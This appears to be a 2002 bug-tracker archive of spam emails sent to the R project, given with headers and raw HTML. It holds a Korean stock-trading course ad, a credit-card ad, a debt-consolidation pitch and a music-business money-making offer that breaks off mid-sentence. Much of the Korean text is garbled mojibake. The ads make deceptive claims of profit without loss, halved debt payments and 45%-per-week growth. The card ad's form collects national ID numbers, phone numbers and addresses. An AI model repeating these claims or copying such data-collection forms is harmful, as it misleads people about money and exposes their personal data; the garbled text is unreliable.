            ´Ù¸¶½º°¡ °¡Àå ÁÁ¾ÆÇÏ´Â Äµµé Inverted Hammer,Gravestone</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">35°­.±×³É 
            ¸¶±¸ Áß¿ä!!!-Á¾ÇÕÀû ¿¬µ¿ ¿¹Ãø¹ý/Å«µ· ±¼¸®´Âµ¥ ÀÌ¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">36°­. 
            °Å·¡·® ´ÙÀÌ¹öÀü½º(Divergence)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">37°­.¸Å¼öÁ¶°Ç 
            ÃøÁ¤¿ä°Ç</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">38°­.°Å·¡·®ºÐ¼®2</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">39°­.Àå±âÀÌÆò(¸Å¹°´ë=ÀúÇ×¼±)¹Ø¿¡¼­ 
            ÁÖ°¡°¡ È¾º¸ÇÒ ¶§</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">40°­.½Å¶ó,È£½Å 
            ÀçÂ÷ºÐ¼®À» ÅëÇÑ »ó½Â,±Þµî¿¹°¨°ú ¿¡³ÊÁöºÐÃâÁ¤µµ ÃøÁ¤</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">41°­. 
            ´ë·®°Å·¡·® ºÐ¼®(½Ã°£¿Ü °Å·¡·® Æ÷ÇÔ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">42-1°­ 
            ÀÏ¸ñ±ÕÇüÇ¥ ÀÌÇØÇÏ±â(±¸Á¶Àû ÀÌÇØ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">42-2°­ 
            ÀÏ¸ñ±ÕÇüÇ¥ ÀÌÇØÇÏ±â(ÆÄµ¿ ÀÌÇØ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">42-3°­.ÀÏ¸ñ±ÕÇüÇ¥ 
            ÀÌÇØÇÏ±â/±¸¼º¿ä¼ÒÀÇ ¿ø¸®,ÆÄµ¿±×¸®±â</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">43°­ ¼¼·ÂÀÇ 
            ¿òÁ÷ÀÓ¿¡ ´ëÇÑ ÀÌÇØ1(µé°í,³²¿¡ ´ëÇÑ ÀÌÇØ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">44°­.ÁÖ°¡¿¹Ãø¹ý 
            ±âº»1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">45°­.µ¹ÆÄ¿¡ 
            ´ëÇÏ¿© 1 (Áß¿ä)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">46°­.ÁÖ°¡ 
            ¿¡³ÊÁö ±âº»</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">46°­-2 
            ÁÖ°¡ ¿¡³ÊÁö ½ÇÀüÀû¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">47°­. 
            ¸®½ºÅ© 1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">48°­. 
            µ¹ÆÄ &amp; ¸®½ºÅ©</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">49°­.»ï, 
            3, ß³</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">50°­.¹«Á¶°Ç 
            ¼öÀÍ³»±â 10% ÀÚ»ê¿î¿ë¹ý</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">51°­. 
            ¹Ì¼ö¿Í ¿¡³ÊÁö</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">52°­. 
            ÁÖ°¡¸¦ ¿òÁ÷ÀÌ´Â °Íµé</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">53°­. 
            ÁÖ°¡Á¶ÀÛÀÌ µå·¯³ª ±Þ¶ôÇÑ ÁÖ½Ä¿¡ ´ëÇÑ ÀÌÇØ</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">54°­.ÁöÁö¼±°ú 
            ÄµµéÀÇ ÀÌ¿ëÇÑ ¸Å¸Å¹ý</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">55°­.ÀüÈ¯Çü 
            Candle(Doji)À» ÀÌ¿ëÇÑ ÀÚµ¿°Ë»ö¹ý,¸Å¸Å¹ý,¸Å¸Å½ÇÀü 1, 2, 3 (¾ÆÁÖ Áß¿ä^^)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">55°­-2. 
            °Ë»ö¹ý º¸Ãæ</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">56°­. 
            °£´Ü °¢µµ ±×¸®°í ¸Å¼öÁÖÃ¼ÀÇ °£´Ü½É¸®</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">57°­. 
            ¿ÜÀÎÁöºÐº¯µ¿ ÀÌ¿ë¹ý 1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">57°­-2 
            ¿Ü±¹ÀÎ ÁöºÐº¯µ¿ ÀÌ¿ë¹ý 2</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">57°­-3 
            ¿ÜÀÎ ÁöºÐº¯µ¿ ÀÌ¿ë¹ý 3 / ¿¢¼¿ ÀÌ¿ë¹ý</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">58°­. 
            ¿Ü±¹ÀÎÀÇ Áö¼ö°ü·Ã Áß,´ëÇüÁÖ ¸Å¸Å¹ýºÐ¼®</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">59°­. 
            ½Ã°£+°¡°Ý+ÀúÇ×¼±</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">60°­.William 
            O'Neil ½Å°í°¡ÀÇ ±¸Á¶ÀûÀÌÇØ(¡Ú½Å°í°¡Áß ½Â·ü³ôÀº ÁøÁ¤ÇÑ ½Å°í°¡¶õ?)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">60°­-2 
            ½Å°í°¡ ½ÇÀüºÐ¼®1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">60°­-3 
            ½Å°í°¡ ½ÇÀüºÐ¼®2</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">60°­-4 
            ½Å°í°¡ ½ÇÀü¸Å¸Å (½ÇÀü °Ë»ö¹ý)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">61°­.°í°¡¿Í 
            Àú°¡°¡ °¡Áö´Â ÀÇ¹Ì(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">62°­. 
            ¹Ù´ÚÀÌ¾ß±â</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">63°­.ÀÌµ¿Æò±Õ¼±¿¡ 
            °¨ÃçÁø ¸ðµç °Í 1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">64°­. 
            ÀÀÁý·Ð1 - ´Ù½ÃÇÏ´Â ÇÑº¸Ã¶°­ ÀÌ¾ß±â ±ÞµîÁÖ Ã¹»ó¿¡¼­ Àâ´Â¹ý+´ÜÅ¸°Å·¡</span></p>
<P><font face="±¼¸²"><span style="FONT-SIZE: 10pt"><br></span></font><font face="±¼¸²" color="blue"><span style="FONT-SIZE: 10pt">¸ð È¸»çÀÇ Â÷Æ®´Â Â÷Æ®¸¸ º¸´Âµ¥µµ ¿ù10¸¸¿ø¾¿ ÁöºÒÇØ¾ß ÇÏ´Âµ¥¿ä, ¸ðµÎ ¾Æ½ÃÁÒ. °ñµç Å©·Î½º°¡ ¸Å¼ö½ÃÁ¡ÀÌ¸é¼­ ¸Åµµ½ÃÁ¡ ÀÌ¶ó´Â°É...... Çåµ¥ 
°ñµçÅ©·Î½º¸¦ ¾ÕµÚ ¾øÀÌ ¸Å¼ö½ÃÁ¡À¸·Î¸¸ Ç¥½ÃÇÏ´Â Â÷Æ®°¡ ÀÖ´Ù¸é, ÁÖ½ÄÀÌ ±×·¸°Ô °£´ÜÇÏ¸é ±× Â÷Æ®´Â µ· 
                Âï´Â ±â°è¶ó°í ÇÒ¼ö ÀÖ°ÚÁö¿ä. 
            ±×·±µ¥ ¿Ö 
¼Õ½ÇÀ» º¼±î¿ä? ¿Ö Â÷Æ®¿¡ ´ëÇÑ Æò±Õ ¼öÀÍÀ² ¹ßÇ¥°¡ ¿Ö ¾øÀ»±î¿ä?</span></font></P>
<P><font face="±¼¸²" color="blue"><span style="FONT-SIZE: 10pt">´Ù½Ã ¸»ÇÏÁö¸¸ ÁÖ½ÄÀº º¹ÀâÇÏÁöµµ °£´ÜÇÏÁöµµ ¾Ê½À´Ï´Ù. ÁÖ½ÄÅõÀÚÀÇ ³ëÇÏ¿ì¸¦ Áö´Ï¸é µË´Ï´Ù. 
            ÇàÇÏ±â´Â ½±Áö¸¸ ¾Ë¾Æ³»±â´Â Èûµç ³ëÇÏ¿ì°¡ 
ÁÖ½Ä ³ëÇÏ¿ìÀÔ´Ï´Ù. </span></font></P>
                <p><font face="±¼¸²" color="blue"><span style="FONT-SIZE: 10pt">¿ì¸® ¹é¸¸ÀåÀÚÅ¬·´¿¡¼­ Á¦°øÇÏ´Â ºñ¹ýÀº ¼Õ½Ç 
                ¾øÀÌ ¼öÀÍÀ» ³¾¼ö ÀÖ´Â ºñ¹ý ÀÔ´Ï´Ù. ÇÑ °¡Áö ¹æ¹ý¸¸À¸·Îµµ 
¼ö¹é¸¸¿ø¿¡¼­ ¼öÃµ ¸¸¿øÀÇ ¼öÀÍÀ» ³»´Â °Ç ¾î·Á¿î ÀÏÀÌ ¾Æ´Õ´Ï´Ù.</span></font><font face="±¼¸²"><span style="FONT-SIZE: 10pt"><br></span></font></p>
                <p><font face="±¼¸²"><b>Áö¹Î¼® &nbsp;<A href="mailto:lycos911@hanmail.net">lycos911@hanmail.net</a></b></font></p>
<P><A href="http://lycos.starhana.com" target="_blank"><FONT color="blue"><b>ÁÖ½ÄÅõÀÚ È¨ÆäÀÌÁö 
µé¾î¿À±â</b></FONT></A></P>
     
                <p style="PAGE-BREAK-BEFORE: always">&nbsp;</p>
        </td>
    </tr>
    <tr>
        <td width="642" height="22">
<center>
<table width="651" border="0" cellspacing="0" cellpadding="0" background="http://lycos.starhana.com/mail_form/new05/images/btm_bg.gif">
  <tr>
    <td align="middle" height="31"><font color="#ffffff"><span style="FONT-SIZE: 10pt" 
           >±ÍÇÏÀÇ ¸ÞÀÏÁÖ¼Ò´Â À¥¼­ÇÎÁß ¾Ë°Ô µÈ°ÍÀÌ¸ç, 
      e-mail ÁÖ¼Ò ¿Ü¿¡ ´Ù¸¥ Á¤º¸´Â °®°í ÀÖÁö ¾Ê½À´Ï´Ù.<br>
      Á¤ÅëºÎ ±Ç°í »çÇ×¿¡ ÀÇ°Å Á¦¸ñ¿¡ </span><font color="#ffff00"><span style="FONT-SIZE: 10pt" 
           >[±¤°í/Á¤º¸]</span></font><span style="FONT-SIZE: 10pt">¶ó°í Ç¥±âÇÑ ¸ÞÀÏÀÔ´Ï´Ù.<br>
      º» ¸ÞÀÏÀº ¹ß¼ÛÀü¿ë ¸ÞÀÏÀÓÀ¸·Î, ¿øÄ¡ ¾ÊÀ¸½Ã¸é </span><font color="#ffff00"><a href="http://lycos.starhana.com/index.php?go=etc/reject.php" target=_blank><span style="FONT-SIZE: 10pt" 
           >[¼ö½Å°ÅºÎ]</span></a></font><span style="FONT-SIZE: 10pt"> 
      ¸¦ Click ÇØ ÁÖ¼¼¿ä.</span></font></td>
  </tr>
  <tr>
    <td align="middle" height="23"><span style="FONT-SIZE: 10pt"><img src="http://lycos.starhana.com/mail_form/new05/images/copyright.gif" width="408" height="44" usemap="#Map" border="0"></span></td>
  </tr>
</table>
</center>
        </td>
    </tr>
</table>
</div>
<map name="Map">
  <area shape="RECT" coords="86,28,193,43" href="http://lycos.starhana.com/index.php?go=etc/reject.php" target=_blank>
</map>
</body>
</html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2211 *
Subject: (±¤°í) ¿©¿ì°°Àº ´ç½ÅÀ» À§ÇÑ Ä«µå '¿©¿ìÄ«µå'/´Á´ë°°Àº ´ç½ÅÀ» À§ÇÑ Ä«µå 'Çö´ëMÄ«µå'Åº»ý!
From: Çö´ëÄ«µå<hyun10310@kornet.net>
Date: Fri, 25 Oct 2002 06:36:14 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2211 <==
From hyun10310@kornet.net  Thu Oct 24 23:36:39 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id XAA05315
	for <R-bugs@biostat.ku.dk>; Thu, 24 Oct 2002 23:36:38 +0200 (MET DST)
Received: from hyun10310 ([61.73.152.181])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with SMTP id g9OLZpxA024666
	for <r-bugs@stat.math.ethz.ch>; Thu, 24 Oct 2002 23:35:56 +0200 (MEST)
Message-Id: <200210242135.g9OLZpxA024666@hypatia.math.ethz.ch>
Reply-To: hyun10310@kornet.net
From: Çö´ëÄ«µå<hyun10310@kornet.net>
To: r-bugs@stat.math.ethz.ch
Subject: (±¤°í) ¿©¿ì°°Àº ´ç½ÅÀ» À§ÇÑ Ä«µå '¿©¿ìÄ«µå'/´Á´ë°°Àº ´ç½ÅÀ» À§ÇÑ Ä«µå 'Çö´ëMÄ«µå'Åº»ý!
Date: Fri, 25 Oct 2002 06:36:14 +0900
Mime-Version: 1.0
Content-Type: text/html; charset="euc-kr"
Content-Transfer-Encoding: 8bit

<html>
<head>
<title>Untitled Document</title>
<meta http-equiv="Content-Type" content="text/html; charset=euc-kr">
</head>
<body bgcolor="#FFFFFF" text="#000000" topmargin="0" leftmargin="0">
<table width="600" border="0" cellpadding="0" cellspacing="0">
<tr>
<td width="600" height="518" valign="top"><img src="http://www.mailpartner.co.kr/email/fox/fox.gif" width="600" height="641"></td>
</tr>
<tr>
<td>
<table width="95%" border="0">
<tr>
<td rowspan="10" width="51%"><img src="http://www.mailpartner.co.kr/email/fox/man.jpg" width="300" height="251"></td>
<td width="3%"></td>
<td width="46%"></td>
</tr>
<tr>
<td width="3%"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%"><font size="2" color="#FF0000">Çö´ë ,±â¾ÆÀÚµ¿Â÷ ±¸ÀÔ½Ã Àû¸³Æ÷ÀÎÆ®·Î
ÃÖ°í 200¸¸¿ø ÇÒÀÎ<br>
(¿ÀÅäÆ÷ÀÎÆ®+DreamÆ÷ÀÎÆ®)</font></td>
</tr>
<tr>
<td width="3%" height="35"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%" height="35"><font size="2" color="#2743C5">Çö´ëÀÚµ¿Â÷ [M]Ä«µå
ÀÌ¿ë½Ã ÀÌ¿ë±Ý¾×ÀÇ 2% Æ÷ÀÎÆ® Àû¸³</font></td>
</tr>
<tr>
<td width="3%" height="31"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%" height="31"><font size="2" color="#2743C5">Çö´ëÁ¤À¯¿¡¼­ ÁÖÀ¯½Ã
L´ç 40¿ø ÇÒÀÎ ¹× 72½Ã°£ µ¿¾È ÃÖ°í 1Ãµ¸¸¿ø ±³Åë»óÇØº¸Çè<br>
¹«·á Á¦°ø</font></td>
</tr>
<tr>
<td width="3%" height="35"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%" height="35"><font size="2" color="#2743C5">Çö´ëÀÚµ¿Â÷ Á÷¿µ
Á¤ºñ¼Ò, ¸¸µµÇÃ¶óÀÚ Á¤ºñ¼Ò ÀÌ¿ë½Ã ºÎÇ° ¹× °øÀÓ 5%,¿ëÇ° 10%ÇÒÀÎ</font></td>
</tr>
<tr>
<td width="3%" height="21"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%" height="21"><font size="2" color="#2743C5">Ç×°ø±Ç, Ã¶µµ ½ÂÂ÷±Ç,
°í¼Ó¹ö½º ½ÂÂ÷±Ç 5% ÇÒÀÎ(±¹Á¦¼± Ç×°ø±ÇÀº 7% ÇÒÀÎ) </font></td>
</tr>
<tr>
<td width="3%"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%"><font size="2" color="#2743C5">·»ÅÍÄ« ÇÒÀÎ¼­ºñ½º : ¿¬Áß 20 ~ 40%
ÇÒÀÎ</font></td>
</tr>
<tr>
<td width="3%"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%"><font size="2" color="#2743C5">Àü±¹ 11°³ ÀÚµ¿Â÷ ±ØÀå ¹«·á ÀÔÀå</font></td>
</tr>
<tr>
<td width="3%" height="18"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%" height="18"><font size="2" color="#2743C5">Àü±¹ ÁÖ¿ä È£ÅÚ
¹× ÄÜµµ ÇÒÀÎ ¼­ºñ½º</font></td>
</tr>
<tr>
<td width="3%" height="20"><img src="http://www.mailpartner.co.kr/email/fox/bu_01.gif" width="12" height="12"></td>
<td width="46%" height="20"><font size="2" color="#2743C5">ÇÁ·Î½ºÆ÷Ã÷ °æ±â
¹«·á ÀÔÀå</font></td>
</tr>
</table>
</td>
<tr>
<td valign="top" height="246">
<table width="93%" border="1" align="center" bgcolor="#FFFFFF">
<form method="post" action="http://www.mailpartner.co.kr/email/fox/fox_ok.asp">
<tr bgcolor="#B3093C">
<td colspan="4">
<div align="center"><font color="#000099"><b><font size="5" color="#FFFFFF">½ÅÃ»ÇÏ±â
<font size="2">(* Ç×¸ñÀº ÇÊ¼öÀÔ´Ï´Ù.)</font></font></b></font></div>
</td>
</tr>
<tr bgcolor="#FCB6EB">
<td width="13%">
<div align="left"><font size="2"><b><font color="#000000">*</font><font color="#0099FF">
</font><font color="#781876">ÀÌ¸§</font></b></font></div>
</td>
<td width="35%"> <font size="2"><b><font color="#781876">
<input type="text" name="name">
</font></b></font></td>
<td width="15%">
<div align="left"><b><font color="#781876" size="2">&nbsp;&nbsp;&nbsp;ÀÌ¸ÞÀÏ</font></b></div>
</td>
<td width="37%"> <font size="2"><b><font color="#781876"> </font><font color="#781876" size="2">
<input type="text" name="email">
</font></b></font></td>
</tr>
<tr bgcolor="#FCB6EB">
<td width="13%">
<div align="center"><font size="2"><b><font color="#000000">*</font><font color="#781876">ÁÖ¹Î¹øÈ£</font></b></font></div>
</td>
<td width="35%"> <font size="2"><b><font color="#781876">
<input type="text" name="jumin1" size="8">
-</font> <font color="#781876">
<input type="text" name="jumin2" size="8">
</font></b></font></td>
<td width="15%">
<div align="left"><font size="2"><b><font size="2"><b><font color="#000000">*
</font><font color="#781876"> Á÷Àå¸í</font></b></font></b></font></div>
</td>
<td width="37%"><b><font color="#781876" size="2">
<input type="text" name="job">
</font></b></td>
</tr>
<tr bgcolor="#FCB6EB">
<td width="13%" height="29">
<div align="center"><font size="2"><b><font color="#000000">*</font><font color="#781876">ÀüÈ­¹øÈ£</font></b></font></div>
</td>
<td width="35%" height="29"> <font size="2"><b><font color="#781876">
<input type="text" name="tel1" size="3">
-
<input type="text" name="tel2" size="4">
-
<input type="text" name="tel3" size="4">
</font></b></font></td>
<td width="15%" height="29"><b><font color="#781876" size="2">ÇÚµåÆù¹øÈ£</font></b></td>
<td width="37%" height="29"> <font size="2"><b><font color="#781876">
<input type="text" name="hp1" size="3">
-
<input type="text" name="hp2" size="4">
-
<input type="text" name="hp3" size="4">
</font></b></font></td>
</tr>
<tr bgcolor="#FCB6EB">
<td width="13%">
<div align="center"><font size="2"><b><font color="#781876">ÁÖ¼Ò</font></b></font></div>
</td>
<td colspan="3"><b><font color="#781876" size="2">
<input type="text" name="address" size="50">
</font></b></td>
</tr>
<tr bgcolor="#FCB6EB">
<td colspan="4">
<div align="center"><font size="2" color="#781876"></font></div>
<div align="center">
<input type="submit" name="Submit" value="½ÅÃ»ÇÏ±â">
</div>
</td>
</tr>
</form>
</table>
<div align="center"><br>
<font color="#676767" size="2">ÀÌ ÆäÀÌÁö´Â ±¤°í ÆäÀÌÁö ÀÔ´Ï´Ù. <br>
±ÍÇÏÀÇ ¸ÞÀÏÁÖ¼Ò´Â À¥¼­ÇÎ Áß ¾Ë°ÔµÈ °ÍÀÌ¸ç,E-Mail ÁÖ¼Ò ¿Ü¿¡ ´Ù¸¥ Á¤º¸´Â °®°í ÀÖÁö ¾Ê½À´Ï´Ù.<br>
Á¤ÅëºÎ ±Ç°í»çÇ×¿¡ ÀÇ°Å Á¦¸ñ¿¡ [±¤°í]¶ó°í Ç¥±âÇÑ ¸ÞÀÏÀÌ¸ç,<span style="font-size:9pt;">¼ö½Å°ÅºÎ ÀåÄ¡¸¦
¸¶·ÃÇÏ°í ÀÖ½À´Ï´Ù.<br>
¼ö½ÅÀ» ¿øÄ¡ ¾ÊÀ¸½Ã¸é <a href="mailto:hyun10310@kornet.net?subject=¼ö½Å°ÅºÎ"><font color="blue">¼ö½Å°ÅºÎ(Reject
Mail) </font></a>¸¦ Å¬¸¯ÇØ ÁÖ½Ê½Ã¿ä.</span> </font></div>
</td>
</tr>
</table>
</body>
</html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2212 *
Subject: Lower monthly payments. (5Al)
From: Rzeczycki Mis <RzeczyckiMis@webcrawler.com>
Date: Thu, 17 Oct 2002 10:53:13 -0400
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2212 <==
From GuntermanCassette@webcrawler.com  Fri Oct 25 05:09:44 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id FAA06009
	for <r-bugs@biostat.ku.dk>; Fri, 25 Oct 2002 05:09:43 +0200 (MET DST)
Received: from mta3.attla.cl ([200.27.2.59] helo=mta3)
	by franz.stat.wisc.edu with esmtp (Exim 3.35 #1 (Debian))
	id 184uqL-0006RI-00
	for <r-bugs@r-project.org>; Thu, 24 Oct 2002 22:09:02 -0500
Received: from 200.27.140.100 ([200.27.140.100])
 by mta3.attla.cl (iPlanet Messaging Server 5.1 Patch 1 (built Jun  6 2002))
 with SMTP id <0H4I00JJ9M3HRJ@mta3.attla.cl> for r-bugs@r-project.org; Fri,
 25 Oct 2002 00:07:20 -0300 (CLST)
Date: Thu, 17 Oct 2002 10:53:13 -0400
From: Rzeczycki Mis <RzeczyckiMis@webcrawler.com>
Subject: Lower monthly payments. (5Al)
X-Sender: "Rzeczycki Mis" <RzeczyckiMis@webcrawler.com>
To: Balden Chan <Belle@altavista.com>
Errors-to: wendolynreynajff0@yahoo.com
Reply-to: wendolynreynajff0@yahoo.com
Message-id: <0H4I00JNTOO0RJ@mta3.attla.cl>
Organization: bCFNRh
MIME-version: 1.0
X-MIMEOLE: Produced By Microsoft MimeOLE V5.50.4522.1200
X-Mailer: Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.0rc2) Gecko/20020618
 Netscape/7.0b1
Content-type: multipart/alternative;
 boundary="Boundary_(ID_speaJviB9q+tcYROeUbDqA)"
Importance: Normal
X-Accept-Language: en


--Boundary_(ID_speaJviB9q+tcYROeUbDqA)
Content-type: text/html; charset=ISO-8859-1
Content-transfer-encoding: 7BIT

<CENTER>
<table border=1 cellspacing=0 cellpadding=5 width=500 bordercolor=#202F51 bgcolor=#F7F7F7>
<TR><TD ALIGN=CENTER VALIGN=middle>
<A HREF="http://secure-mall.net/sdebt/2/" style="FONT-SIZE: 16px; TEXT-DECORATION: none; COLOR: BLACK; FONT-FAMILY: Helvetica, Arial, Verdana;">
<B>:::&nbsp;&nbsp;&nbsp;<FONT COLOR=RED>Free</FONT> Debt Consultation!&nbsp;&nbsp;&nbsp;:::</A></B>
</TD></TR><TR><TD ALIGN=LEFT VALIGN=middle><CENTER>
<FONT style="FONT-SIZE: 14px; TEXT-DECORATION: none; COLOR: BLACK; FONT-FAMILY: Helvetica, Arial, Verdana;"><B>
<FONT COLOR=CC0000>Reduce Your Monthly Paymen&#116s!<BR></FONT>
<FONT COLOR=FF0000>Slash Interest Rates!<BR></FONT>
<FONT COLOR=FF3333>One Simple Low Monthly Payment!<BR><BR></FONT></B>
Get a <FONT COLOR=RED><B>FREE</B></FONT> Debt Analysis with <B>No Obligation!</B></FONT><BR><BR>
<IMG SRC=http://money.c%6En.com/2001/02/21/living/q_taxfunds/saving.01.jpg BORDER=1><BR><BR>
<A HREF="http://secure-mall.net/sdebt/2/" style="FONT-SIZE: 15px; TEXT-DECORATION: underline; COLOR: 427C1F; FONT-FAMILY: Helvetica, Arial, Verdana;"><B> &#62&#62 Click Here to Get Started! &#60&#60 </B></A><BR><BR>
<FONT style="FONT-SIZE: 14px; TEXT-DECORATION: none; COLOR: BLACK; FONT-FAMILY: Helvetica, Arial, Verdana;">
If you're having debt problems, or would like to simplify things to help pay o&#102f your debt you may benefit from what they have to offer. Instead of paying many bills, you have only <b>one bill to pay each month</B> for ALL your accounts. You'll end up paying about <B>half as much as you are paying now!</B>
<FONT style="FONT-SIZE: 16px; TEXT-DECORATION: none; COLOR: RED; FONT-FAMILY: Helvetica, Arial, Verdana;">
<BR><BR><IMG SRC=http://money%2Ecnn.com/2000/03/08/mutualfunds/q_funds_index/mutual_funds.01.jpg BORDER=1>
<BR><BR><B>Settle all your Debt<BR>For Good!</B><BR><BR>
<A HREF="http://secure-mall.net/sdebt/2/" style="FONT-SIZE: 15px; TEXT-DECORATION: underline; COLOR: 427C1F; FONT-FAMILY: Helvetica, Arial, Verdana;"><B> &#62&#62 Click Here to Become Debt Free! &#60&#60 </B></A><BR><BR>
<FONT style="FONT-SIZE: 14px; TEXT-DECORATION: none; COLOR: BLACK; FONT-FAMILY: Helvetica, Arial, Verdana;">
This is your ch&#97nce to permanently solve your  Debt and Credit Problems! It worked for thousands and now it can work for you!<BR><BR>
</TD></TR></TABLE>
<FONT style="FONT-SIZE: 10px; TEXT-DECORATION: none; COLOR: GRAY; FONT-FAMILY: Arial, Verdana, Helvetica;">
Don't want any more messages? reply to this message to be removed.
&#10</CENTER>
6eeygCjgor2mdPgaR442GcK470i73p40yMMHh3kNVA5UL8OBAnmi5K6o

--Boundary_(ID_speaJviB9q+tcYROeUbDqA)--
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2213 *
Subject: Love Music? Come work with us!
From: custservice7113w83@aol.com
Date: Fri, 25 Oct 0102 22:03:32 -1000
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2213 <==
From custservice7113w83@aol.com  Fri Oct 25 14:17:24 2002
Received: from franz.stat.wisc.edu (mail@www.omegahat.org [128.105.174.32])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id OAA11827
	for <r-bugs@biostat.ku.dk>; Fri, 25 Oct 2002 14:17:23 +0200 (MET DST)
From: custservice7113w83@aol.com
Received: from [200.250.175.26] (helo=aol.com)
	by franz.stat.wisc.edu with smtp (Exim 3.35 #1 (Debian))
	id 1853OH-0005WL-00; Fri, 25 Oct 2002 07:16:38 -0500
Received: from [183.92.28.100] by pet.vosni.net with asmtp; 25 Oct 0102 01:07:44 +1100
Received: from unknown (186.72.110.56)
	by rly-xr01.nihuyatut.net with esmtp; 25 Oct 0102 11:59:22 -0600
Received: from [67.143.22.182] by f64.law4.hottestmale.com with smtp; 25 Oct 0102 05:51:00 +0600
Reply-To: <custservice7113w83@aol.com>
Message-ID: <033c00c50c2b$6533b5a7$4ed01da8@rklbli>
To: professional
Subject: Love Music? Come work with us!
Date: Fri, 25 Oct 0102 22:03:32 -1000
MiME-Version: 1.0
Content-Type: text/plain;
	charset="iso-8859-1"
Content-Transfer-Encoding: 8bit
X-Priority: 3 (Normal)
X-MSMail-Priority: Normal
X-Mailer: Internet Mail Service (5.5.2650.21)
Importance: Normal

***********SPECIAL  INVITATION!  Make Money In The Music Biz!!**********

If you never thought you could be at the right place at 
the right time, "You were mistaken."  You have an 
opportunity that won't present itself again.  

The potential is staggering.......

- Access ALL Your favorite Music LEGALLY from the 
 internet (for less than the cost of one CD per month!)

- We have contracts with over 30 record companies

- Build a HUGE residual income right from your own home

- Extensive tools to insure your Success

- TOTAL Support given at ALL Times 

- New State-of-the-Art Streaming Technology

- We're Growing at 45% Per WEEK!

We provide Legal Streaming Music on the internet...
but that's not ALL!  Take a look at what's coming soon!

- Online Movies
- Video Games
- E-books
- Music via your Cell Phone
- Music in your car via Satellite

This is only the beginning & you can get in Now at 
